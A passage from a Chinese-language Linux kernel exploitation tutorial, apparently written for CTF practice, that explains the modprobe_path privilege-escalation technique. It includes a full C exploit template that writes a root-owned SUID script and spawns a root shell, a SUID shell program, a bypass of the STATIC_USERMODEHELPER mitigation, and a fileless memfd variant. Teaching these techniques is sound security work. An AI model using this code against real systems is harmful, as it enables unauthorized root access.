<p>这会调用 <code>do_execveat_common()</code> &gt; <code>bprm_execve()</code> &gt; <code>exec_binprm()</code>，然后调用 <code>search_binary_handler()</code>。这个函数会查找 <code>formats</code> 链表中合适的加载器函数来处理指定的二进制文件。<code>formats</code> 只是一个包含 <code>struct linux_binfmt</code> 的链表。</p>


<pre><font color="#C01C28"><b>pwndbg&gt; </b></font>delist formats
&#36;1 = {
  <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff82a12d20</font> &lt;<font color="#A2734C">script_format</font>&gt;,
  <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff829fba70</font> &lt;<font color="#A2734C">formats</font>&gt;
}
&#36;2 = {
  <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff82a12d60</font> &lt;<font color="#A2734C">elf_format</font>&gt;,
  <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff82a12c80</font> &lt;<font color="#A2734C">misc_format</font>&gt;
}
&#36;3 = {
  <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff82a12da0</font> &lt;<font color="#A2734C">compat_elf_format</font>&gt;,
  <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff82a12d20</font> &lt;<font color="#A2734C">script_format</font>&gt;
}
&#36;4 = {
  <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff829fba70</font> &lt;<font color="#A2734C">formats</font>&gt;,
  <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff82a12d60</font> &lt;<font color="#A2734C">elf_format</font>&gt;
}
&#36;5 = {
  <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff82a12c80</font> &lt;<font color="#A2734C">misc_format</font>&gt;,
  <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff82a12da0</font> &lt;<font color="#A2734C">compat_elf_format</font>&gt;
}
</pre>



<p>此列表中包含四种格式：<code>elf_format</code> 是常见的 ELF 二进制格式，<code>compat_elf_format</code> 与 <code>elf_format</code> 相同，<code>script_format</code> 是用于脚本文件（以 <code>#!</code> 开头），<code>misc_format</code> 是用于其他二进制文件。每种格式都有如下结构，其中最重要的成员是 <code>load_binary</code>：</p>


<pre><font color="#C01C28"><b>pwndbg&gt; </b></font>p script_format
&#36;9 = {
  <font color="#2AA1B3">lh</font> = {
    <font color="#2AA1B3">next</font> = <font color="#12488B">0xffffffff82a12d60</font> &lt;<font color="#A2734C">elf_format</font>&gt;,
    <font color="#2AA1B3">prev</font> = <font color="#12488B">0xffffffff82a12c80</font> &lt;<font color="#A2734C">misc_format</font>&gt;
  },
  <font color="#2AA1B3">module</font> = <font color="#12488B">0x0</font> &lt;<font color="#A2734C">fixed_percpu_data</font>&gt;,
  <font color="#2AA1B3">load_binary</font> = <font color="#12488B">0xffffffff813d20a0</font> &lt;<font color="#A2734C">load_script</font>&gt;,
  <font color="#2AA1B3">load_shlib</font> = <font color="#12488B">0x0</font> &lt;<font color="#A2734C">fixed_percpu_data</font>&gt;,
  <font color="#2AA1B3">core_dump</font> = <font color="#12488B">0x0</font> &lt;<font color="#A2734C">fixed_percpu_data</font>&gt;,
  <font color="#2AA1B3">min_coredump</font> = 0
}
</pre>



<p>在 <code>search_binary_handler()</code> 中，<code>formats</code> 列表会通过循环遍历并调用每个 <code>load_binary()</code> 来处理二进制文件</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">retry:</span><br><span class="line">	read_lock(&amp;binfmt_lock);</span><br><span class="line">	list_for_each_entry(fmt, &amp;formats, lh) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(fmt-&gt;module))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		read_unlock(&amp;binfmt_lock);</span><br><span class="line"></span><br><span class="line">		retval = fmt-&gt;load_binary(bprm);</span><br><span class="line"></span><br><span class="line">		read_lock(&amp;binfmt_lock);</span><br><span class="line">		put_binfmt(fmt);</span><br><span class="line">		<span class="keyword">if</span> (bprm-&gt;point_of_no_return || (retval != -ENOEXEC)) &#123;</span><br><span class="line">			read_unlock(&amp;binfmt_lock);</span><br><span class="line">			<span class="keyword">return</span> retval;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	read_unlock(&amp;binfmt_lock);</span><br></pre></td></tr></table></figure></div>

<p>例如，<code>elf_format</code> 的 <code>load_binary</code> 是 <code>load_elf_binary()</code>，它会检查二进制的 ELF 头部是否以 <code>\x7FELF</code> 开头：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(elf_ex-&gt;e_ident, ELFMAG, SELFMAG) != <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br></pre></td></tr></table></figure></div>

<p><code>script_format</code> 的 <code>load_binary</code> 是 <code>load_script()</code>，它会检查脚本文件的 shebang。如果 shebang 有效，<code>bprm-&gt;interpreter</code> 会被设置为指定的解释器，原始的二进制文件名会作为 <code>argv</code> 的一个参数传递，然后重新搜索合适的处理程序。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((bprm-&gt;buf[<span class="number">0</span>] != <span class="string">&#x27;#&#x27;</span>) || (bprm-&gt;buf[<span class="number">1</span>] != <span class="string">&#x27;!&#x27;</span>))</span><br><span class="line">	<span class="keyword">return</span> -ENOEXEC;</span><br></pre></td></tr></table></figure></div>

<p>如果没有找到适当的二进制格式处理程序，程序会执行以下路径：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (need_retry) &#123;</span><br><span class="line">	<span class="keyword">if</span> (printable(bprm-&gt;buf[<span class="number">0</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">1</span>]) &amp;&amp;</span><br><span class="line">	    printable(bprm-&gt;buf[<span class="number">2</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">3</span>]))</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	<span class="keyword">if</span> (request_module(<span class="string">&quot;binfmt-%04x&quot;</span>, *(ushort *)(bprm-&gt;buf + <span class="number">2</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	need_retry = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这会检查二进制的前四个字节是否为可打印字符（非 ASCII 字符除外）。然后，它调用 <code>request_module()</code> 来加载与二进制文件头部相符的模块，模块名为 <code>binfmt-&lt;前四个字节&gt;</code>。它最终会调用 <code>__request_module()</code>，并且会调用 <code>call_modprobe()</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="type">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数尝试加载指定的二进制文件作为模块。默认的辅助程序路径定义在 <code>kernel/kmod.c</code> 文件中，为 <code>/sbin/modprobe</code>，并且它会以 root 权限执行。注意这个路径并不是 <code>const</code> 类型的。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> modprobe_path[KMOD_PATH_LEN] = <span class="string">&quot;/sbin/modprobe&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>为了利用这一点，我们可以将 <code>modprobe_path</code> 的值覆盖为提权脚本（例如赋予 <code>/bin/sh</code> root SUID 权限）的路径 <code>/tmp/privesc_script.sh</code>，然后通过尝试执行一个无效格式的文件（如 <code>ffff ffff</code>）来调用 <code>modprobe</code>。内核将以 root 权限运行 <code>/tmp/privesc_script.sh -q -- binfmt-ffff</code>，这样我们就可以以 root 权限运行任何代码。这使得我们不必自己运行内核函数，而是可以通过覆盖一个字符串轻松提权。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/modprobe_path.svg"
                      alt="modprobe_path"
                ></p>
<p>在 <code>privesc_script.sh</code> 脚本中我们通常会写一些需要 root 权限执行的命令。在 ctf 中我们一般的做法是给 flag 赋予普通用户可读的权限。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 /flag</span><br></pre></td></tr></table></figure></div>

<p>不过在实际环境中我们一般会针对一个恶意程序<strong>依次</strong>做如下操作：</p>
<ol>
<li>将恶意程序的所属用户设置为 root。</li>
<li>为恶意程序添加 SUID 权限。</li>
</ol>
<p>对应的脚本内容如下：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> 0:0 /tmp/evil</span><br><span class="line"><span class="built_in">chmod</span> 4555 /tmp/evil</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>/tmp/evil</code> 是如下代码，那么由于 <code>/tmp/evil</code> 已经具有 SUID 权限且所属用户为 root，因此我们执行 <code>/tmp/evil</code> 会返回一个 root 权限的 shell。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 尝试提升为 root 用户权限</span></span><br><span class="line">    <span class="keyword">if</span> (setuid(<span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] setuid failed.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setgid(<span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] setgid failed.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动一个 shell，使用 root 权限</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此通过 modprobe_path 提权的 exp 模板如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_modprobe_path</span><span class="params">(<span class="type">char</span> *modprobe_path, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(modprobe_path, <span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> modprobe_fd = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open /proc/sys/kernel/modprobe.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> read_len = read(modprobe_fd, modprobe_path, len);</span><br><span class="line">    <span class="keyword">if</span> (read_len == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to read /proc/sys/kernel/modprobe.&quot;</span>);</span><br><span class="line">        close(modprobe_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_len == len) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] /proc/sys/kernel/modprobe may not read completely.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_len = <span class="built_in">strlen</span>(modprobe_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_len &gt; <span class="number">1</span> &amp;&amp; modprobe_path[read_len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        modprobe_path[--read_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(modprobe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> read_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;shell&quot;</span>)) &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">        get_modprobe_path(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path));</span><br><span class="line">        remove(modprobe_path);</span><br><span class="line">        remove(<span class="string">&quot;/tmp/trigger&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo \&quot;/sbin/modprobe\&quot; &gt; /proc/sys/kernel/modprobe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] spawning a root shell...&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过内核漏洞修改 modprobe_path 中的路径为普通用户可写的路径。</span></span><br><span class="line">    system(<span class="string">&quot;sudo sh -c &#x27;echo \&quot;/tmp/my_modprobe\&quot; &gt; /proc/sys/kernel/modprobe&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *program_path = realpath(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">    get_modprobe_path(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path));</span><br><span class="line">    <span class="type">int</span> modprobe_fd = open(modprobe_path, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0755</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open modprobe path %s.\n&quot;</span>, modprobe_path);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] creating modprobe script file %s.\n&quot;</span>, modprobe_path);</span><br><span class="line">    dprintf(modprobe_fd, <span class="string">&quot;#! /bin/sh\nchown 0:0 %s\nchmod 4555 %s\n&quot;</span>, program_path, program_path);</span><br><span class="line">    close(modprobe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] creating trigger file /tmp/trigger.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> trigger_fd = open(<span class="string">&quot;/tmp/trigger&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0755</span>);</span><br><span class="line">    write(trigger_fd, <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(trigger_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing trigger file...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/trigger&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *shell_command;</span><br><span class="line">    asprintf(&amp;shell_command, <span class="string">&quot;%s shell&quot;</span>, program_path);</span><br><span class="line">    system(shell_command);</span><br><span class="line">    <span class="built_in">free</span>(shell_command);</span><br><span class="line">    <span class="built_in">free</span>(program_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="STATIC-USERMODEHELPER-防护与绕过"><a href="#STATIC-USERMODEHELPER-防护与绕过" class="headerlink" title="STATIC_USERMODEHELPER 防护与绕过"></a>STATIC_USERMODEHELPER 防护与绕过</h4><p>在某个时间点，<code>CONFIG_STATIC_USERMODEHELPER_PATH</code> 缓解措施被引入，使得覆盖 <code>modprobe_path</code> 变得无用。</p>
<p>该缓解措施的作用主要体现在 <code>call_usermodehelper_setup</code> 函数。在该函数中，<code>sub_info-&gt;path</code> 被设置如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">	sub_info-&gt;path = CONFIG_STATIC_USERMODEHELPER_PATH;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	sub_info-&gt;path = path;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>通过将每个被执行二进制文件的路径设置为类似于 <code>busybox</code> 的二进制文件来工作，而该二进制文件的行为取决于传递的 <code>argv[0]</code> 文件名。因此，即使我们覆盖了 <code>modprobe_path</code>，也只有 <code>argv[0]</code> 的值发生了变化，<code>busybox</code> 类似的二进制文件无法识别这个值，因此不会执行。</p>
<p>不过我们仍然可以覆盖 <code>CONFIG_STATIC_USERMODEHELPER_PATH</code> 本身来实现同样的效果。</p>
<h4 id="无文件方式"><a href="#无文件方式" class="headerlink" title="无文件方式"></a>无文件方式</h4><p>前面的提权方式需要创建至少 1 个 <code>trigger</code> 文件。而对于 <code>chroot</code> 到某个目录的情况下，我们无法获取创建的文件的真实路径，也无法在根目录下创建文件，而 <code>modprobe_path</code> 执行的应当是真实完整的路径下的文件。因此传统的基于文件的 <code>modprobe_path</code> 提权方式失效。</p>
<p>然而在这种情况下，我们创建的匿名内存文件 <code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>。也就是说我们可以知道创建的文件的真实路径，其中路径中的 <code>&lt;pid&gt;</code> 是进程的<strong>真实 pid</strong>，<code>fd</code> 是 <code>memfd_create</code> 返回的句柄。</p>
<blockquote>
<p><strong><code>memfd_create</code> 系统调用</strong>允许进程创建一个匿名内存文件，该文件可以被映射到进程的地址空间。该文件存在于内存中，因此读写该文件时会直接操作内存，而不是磁盘。这在某些情况下非常有用，尤其是在需要临时存储数据，但不希望数据在磁盘上留下任何痕迹时。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">memfd_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数</strong></p>
<ul>
<li><code>name</code>：指定内存文件的名称。虽然这个文件不会在文件系统中创建，但是它有一个名字，主要用于调试和日志记录。传入 <code>NULL</code> 也可以。</li>
<li><code>flags</code>：标志，控制文件的属性。例如，<code>MFD_CLOEXEC</code> 表示在执行 <code>exec</code> 系统调用时，关闭文件描述符；<code>MFD_ALLOW_SEALING</code> 允许文件进行“封印”，即锁定文件的状态，阻止修改。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li><p>如果成功，返回一个文件描述符（<code>fd</code>），该文件描述符指向创建的内存文件。</p>
</li>
<li><p>如果失败，返回 <code>-1</code>，并设置 <code>errno</code> 以指示错误。</p>
</li>
</ul>
</blockquote>
<p>由于匿名内存文件的效果和真实文件一样，我们不妨将 <code>modprobe_path</code> 修改指向自己创建的匿名内存文件中，并且在该文件中写入如下内容：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /sbin/modprobe&gt;/proc/sys/kernel/modprobe</span><br><span class="line">/bin/sh 0&lt;/proc/&lt;exploit_pid&gt;/fd/0 1&gt;/proc/&lt;exploit_pid&gt;/fd/1 2&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

